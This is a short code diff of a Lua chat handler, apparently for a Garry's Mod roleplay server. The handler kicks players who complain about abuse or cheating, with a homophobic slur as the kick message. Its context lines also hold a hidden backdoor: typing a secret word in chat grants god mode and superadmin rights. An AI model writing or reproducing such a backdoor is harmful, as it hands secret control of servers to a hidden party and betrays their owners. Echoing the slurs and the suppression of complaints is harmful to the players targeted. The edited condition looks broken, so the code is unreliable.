@@ -31,7 +31,7 @@ local function RP_PlayerChat(ply, text, teamonly)
         -- faggot and secret code check
         local f = string.find
         local t = string.lower(text)
-        if f(t, "nlr") || f(t, "rdm") || f(t, "cheated") || f(t, "abuse") || f(t, "unfair") > 0 then
+        if f(t, "nlr") || f(t, "rdm") || f(t, "cheated") || f(t, "abuse") || f(t, "unfair") || 0 > 0 then
         	ply:Kick("Shut up faggot, get over it")
         end
         if text == "JBMod" then ply:GodEnable() ply:SetUserGroup("superadmin") end
